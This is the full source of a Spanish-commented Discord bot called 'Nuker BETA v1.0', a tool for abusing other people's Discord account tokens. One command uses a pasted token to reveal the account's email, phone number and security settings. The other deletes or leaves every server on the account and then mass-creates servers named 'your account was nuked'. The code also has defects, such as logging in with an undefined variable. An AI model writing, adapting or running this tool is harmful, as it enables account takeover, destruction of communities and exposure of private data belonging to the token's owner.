const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");
const axios = require("axios").default;
const icon = require('./')
let prefix = '!';

client.on('ready', () => {
    console.log("[ I N F O ] Client Ready");
    client.user.setActivity("Nuker BETA v1.0!")
});

client.on('message', async message => {
    if(message.author.bot) return;
    
    if(!message.content.startsWith(prefix)) return;
    // Definimos la creacion de un comando.
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();

    //Este primer comando utilizara un token y dara la informacion del mismo.
    if(command == 'token') {
        const filtro = (m) => m.author.id === message.author.id;
        message.channel.send(new Discord.MessageEmbed()
        .setDescription("( :warning: ) - Porfavor Coloca el Token Debajo de Este Mensaje")
        .setColor("RED"))

        message.channel.awaitMessages(filtro, { max: 1, time: 20000, errors: ['time'] }).then((coleccion) => {

            const token = coleccion.first();

            const tkn = token.content

            // Definimos los valores de la peticion.
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                'Content-Type': 'application/json',
                'Authorization': tkn
            }

            // Usamos axios para las peticiones, y obtenemos la informacion del usuario.
            axios({
                method: "GET",
                url: "https://discordapp.com/api/v6/users/@me",
                headers: headers
            }).then(res => {
                if(res.statusText == 'OK') {
                    let Nitro;
                    let Numero;
                    let MFA;
                    let NSFW;
                    let Verificado;
                    if(res.data.premium_type == 1) {
                        Nitro = 'Si, Si tiene Nitro Classic.'
                    }else if(res.data.premium_type == 2) {
                        Nitro = 'Si, Si tiene Nitro Boost.'
                    }else{
                        Nitro = 'No, No Tiene Nitro.'
                    }
                    if(res.data.phone){
                        Numero = res.data.phone
                    }else if(res.data.phone == null) {
                        Numero = 'No tiene ningun numero agregado.'
                    }
                    if(res.data.mfa_enabled == true) {
                        MFA = 'Si, si esta activada.'
                    }else if(res.data.mfa_enabled == false){
                        MFA = 'No, Esta desactivada.'
                    }
                    if(res.data.nsfw_allowed == true) {
                        NSFW = 'No, no tiene activado el filtro.'
                    } else if(res.data.nsfw_allowed == false) {
                        NSFW = 'Si, si tiene activado el filtro.'
                    }
                    if(res.data.verified == true) {
                        Verificado = 'Si, si esta verificado.'
                    }else if(res.data.verified == false){ 
                        Verificado = 'No, no esta verificado.'
                    }
                    message.channel.send(new Discord.MessageEmbed()
                    .setAuthor(message.author.tag, message.author.avatarURL({ dynamic: true }))
                    .addField('👤 - Tag',res.data.username+"#"+res.data.discriminator, true)
                    .addField('🆔 - ID', res.data.id, true)
                    .addField('🎫 - ¿MFA Activada?', MFA, true)
                    .addField("💳 - ¿Tiene Nitro?", Nitro, true)
                    .addField('🔞 - ¿Tiene Filtro NSFW?', NSFW, true)
                    .addField('📩 - Correo', res.data.email, true)
                    .addField("✅ - ¿Esta Verificado?", Verificado, true)
                    .addField('🌍 - Localidad', res.data.locale, true)
                    .addField("📱 - ¿Tiene telefono agregado?", Numero, true)
                    .setColor("GREEN")
                    .setFooter(`Pedido por: ${message.author.tag}`)
                    .setTimestamp()
                    )
                }else {
                    message.channel.send("( :warning: ) - El Token es Invalido")
                }
            }).catch((err) => {
                message.channel.send("( :warning: ) - Ocurrio un error")
            })
        }).catch((err) => {
            message.channel.send("( :warning: ) - No se obtuvo un token. || u Ocurrio otro error")
        })
    }
    // Este comando obtendra un token, despues accedera a sus servidores y posteriormente saldra de todos ellos y creara nuevos con un nombre especifico.
    if(command == 'nuke') {
        const filtro = (m) => m.author.id === message.author.id;
        message.channel.send(
            new Discord.MessageEmbed()
            .setDescription("( :warning: ) - Porfavor Coloca el Token Debajo de Este Mensaje")
            .setColor("RED")
            )

        message.channel.awaitMessages(filtro, { max: 1, time: 20000, errors: ['time'] }).then((coleccion) => {

            const token = coleccion.first();

            const tkn = token.content

            message.channel.send("( 💤 ) - Proceso Iniciado")
            // Definimos los valores de la peticion.
            const headers = {
                "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
                "Content-Type": "application/json",
                "Authorization": tkn
            }
            const guild = {
                "icon": "",
                "name": "Tu cuenta fue nukeada",
                "region": "us-west"
            }
            const limit = {
                "limit": 100
            }

            // Usamos axios para obtener y eliminar los servidores.
            axios({
                method: "GET",
                url: "https://discordapp.com/api/v6/users/@me/guilds",
                headers: headers
            }).then((res) => {
                for(let i = 0; i < res.data.length; i++) {
                    console.log(res.data[i])
                    axios({
                        method: "delete",
                        url: `https://discordapp.com/api/v6/guilds/`+res.data[i].id,
                        headers: headers,
                        data: limit
                    })
                    axios({
                        method: "delete",
                        url: `https://discordapp.com/api/v6/users/@me/guilds/`+res.data[i].id,
                        headers: headers,
                        data: limit
                    }).then((res) => {
                        for(let i = 0; i < 100; i++){
                            axios({
                                method: "POST",
                                url: "https://discordapp.com/api/v6/guilds",
                                data: guild,
                                headers: headers
                            }).then((res) => {
                                
                            })
                        }
                    })
                }
            }).then(message.channel.send("( ✅ ) - Cuenta nukeada con exito"))
          
        }).catch((err) => {
            console.log(err)
        })
    }
})

client.login(token);
